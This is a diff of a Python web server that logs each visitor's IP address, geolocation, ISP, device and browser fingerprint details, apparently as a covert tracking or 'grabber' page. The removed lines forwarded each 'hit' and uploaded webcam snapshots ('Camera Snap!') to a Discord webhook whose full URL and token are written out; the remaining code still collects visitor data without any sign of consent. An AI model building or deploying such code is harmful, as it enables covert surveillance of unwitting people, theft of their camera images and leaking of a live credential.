@@ -1,41 +1,7 @@
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import datetime
 import urllib.request
-import urllib.parse
 import json
-import os
-import io
-
-WEBHOOK = 'https://discord.com/api/webhooks/1487460729786470521/PkoLE23Gvw8YUn4XCYLGU69F3aZagIhjyB12VNTDkoknvrVRieCxIVVkjn6T4U9krlvh'
-
-def send_discord(msg):
-    try:
-        data = json.dumps({"content": msg}).encode()
-        req = urllib.request.Request(WEBHOOK, data=data, headers={'Content-Type': 'application/json'})
-        urllib.request.urlopen(req, timeout=10)
-    except Exception as e:
-        print(f"[!] Discord error: {e}", flush=True)
-
-def send_discord_photo(photo_bytes):
-    try:
-        boundary = b'----FormBoundary'
-        body = b'--' + boundary + b'\r\n'
-        body += b'Content-Disposition: form-data; name="file"; filename="photo.jpg"\r\n'
-        body += b'Content-Type: image/jpeg\r\n\r\n'
-        body += photo_bytes + b'\r\n'
-        body += b'--' + boundary + b'\r\n'
-        body += b'Content-Disposition: form-data; name="payload_json"\r\n\r\n'
-        body += json.dumps({"content": "📸 **Camera Snap!"}).encode()
-        body += b'\r\n--' + boundary + b'--\r\n'
-        req = urllib.request.Request(
-            WEBHOOK,
-            data=body,
-            headers={'Content-Type': f'multipart/form-data; boundary={boundary.decode()}'}
-        )
-        urllib.request.urlopen(req, timeout=10)
-        print("[+] Photo sent to Discord", flush=True)
-    except Exception as e:
-        print(f"[!] Photo send error: {e}", flush=True)
 
 def get_ip_info(ip):
     try:
@@ -78,43 +44,24 @@ def log_hit(ip, ua, extra={}):
     os, browser, device = parse_ua(ua)
     country, city, region, isp, flags = get_ip_info(ip)
 
-    msg = f"🎯 New Hit!\n"
-    msg += f"Time: {time}\n"
-    msg += f"IP: {ip}\n"
-    msg += f"Location: {country} / {region} / {city}\n"
-    msg += f"ISP: {isp}\n"
-    msg += f"Network: {flags}\n"
-    msg += f"OS: {os}\n"
-    msg += f"Browser: {browser}\n"
-    msg += f"Device: {device}\n"
-    if extra.get('screen'):        msg += f"Screen: {extra.get('screen')}\n"
-    if extra.get('timezone'):      msg += f"Timezone: {extra.get('timezone')}\n"
-    if extra.get('language'):      msg += f"Language: {extra.get('language')}\n"
-    if extra.get('cores'):         msg += f"CPU Cores: {extra.get('cores')}\n"
-    if extra.get('memory'):        msg += f"RAM: {extra.get('memory')} GB\n"
-    if extra.get('battery_level'): msg += f"Battery: {extra.get('battery_level')} (Charging: {extra.get('battery_charging')})\n"
-    if extra.get('gpu'):           msg += f"GPU: {extra.get('gpu')}\n"
-    if extra.get('connection'):    msg += f"Connection: {extra.get('connection')}\n"
-
-    with open('/tmp/hits.log', 'a') as f:
-        f.write(msg + '---\n')
-    print(msg, flush=True)
-
-def parse_multipart(data, content_type):
-    boundary = None
-    for part in content_type.split(';'):
-        part = part.strip()
-        if part.startswith('boundary='):
-            boundary = part[9:].encode()
-    if not boundary:
-        return None
-    parts = data.split(b'--' + boundary)
-    for part in parts:
-        if b'filename="photo.jpg"' in part:
-            idx = part.find(b'\r\n\r\n')
-            if idx != -1:
-                return part[idx+4:].rstrip(b'\r\n--')
-    return None
+    print(f"\n{'='*50}", flush=True)
+    print(f"  Time       : {time}", flush=True)
+    print(f"  IP         : {ip}", flush=True)
+    print(f"  Location   : {country} / {region} / {city}", flush=True)
+    print(f"  ISP        : {isp}", flush=True)
+    print(f"  Network    : {flags}", flush=True)
+    print(f"  OS         : {os}", flush=True)
+    print(f"  Browser    : {browser}", flush=True)
+    print(f"  Device     : {device}", flush=True)
+    if extra.get('screen'):        print(f"  Screen     : {extra.get('screen')}", flush=True)
+    if extra.get('timezone'):      print(f"  Timezone   : {extra.get('timezone')}", flush=True)
+    if extra.get('language'):      print(f"  Language   : {extra.get('language')}", flush=True)
+    if extra.get('cores'):         print(f"  CPU Cores  : {extra.get('cores')}", flush=True)
+    if extra.get('memory'):        print(f"  RAM        : {extra.get('memory')} GB", flush=True)
+    if extra.get('battery_level'): print(f"  Battery    : {extra.get('battery_level')} (Charging: {extra.get('battery_charging')})", flush=True)
+    if extra.get('gpu'):           print(f"  GPU        : {extra.get('gpu')}", flush=True)
+    if extra.get('connection'):    print(f"  Connection : {extra.get('connection')}", flush=True)
+    print(f"{'='*50}\n", flush=True)
 
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -123,7 +70,7 @@ class Handler(BaseHTTPRequestHandler):
             self.end_headers()
             return
         if self.path == '/' or self.path == '/index.html':
-            ip = self.headers.get("CF-Connecting-IP") or self.headers.get("X-Forwarded-For") or self.client_address[0]
+            ip = self.headers.get('CF-Connecting-IP') or self.headers.get('X-Forwarded-For') or self.client_address[0]
             ua = self.headers.get('User-Agent', 'unknown')
             log_hit(ip, ua)
             with open('index.html', 'rb') as f:
@@ -146,29 +93,16 @@ class Handler(BaseHTTPRequestHandler):
             self.end_headers()
 
     def do_POST(self):
-        content_type = self.headers.get('Content-Type', '')
-        length = int(self.headers.get('Content-Length', 0))
-        body = self.rfile.read(length)
-
         if self.path == '/track':
+            length = int(self.headers.get('Content-Length', 0))
+            body = self.rfile.read(length)
             try:
                 data = json.loads(body)
-                ip = self.headers.get("CF-Connecting-IP") or self.headers.get("X-Forwarded-For") or self.client_address[0]
+                ip = self.headers.get('CF-Connecting-IP') or self.headers.get('X-Forwarded-For') or self.client_address[0]
                 ua = self.headers.get('User-Agent', 'unknown')
                 log_hit(ip, ua, extra=data)
             except Exception as e:
                 print(f"[!] POST error: {e}", flush=True)
-            self.send_response(200)
-            self.end_headers()
-
-        elif self.path == '/photo':
-            try:
-                photo = parse_multipart(body, content_type)
-                if photo:
-                    send_discord_photo(photo)
-                    print("[+] Photo received and sent", flush=True)
-            except Exception as e:
-                print(f"[!] Photo error: {e}", flush=True)
             self.send_response(200)
             self.end_headers()
 
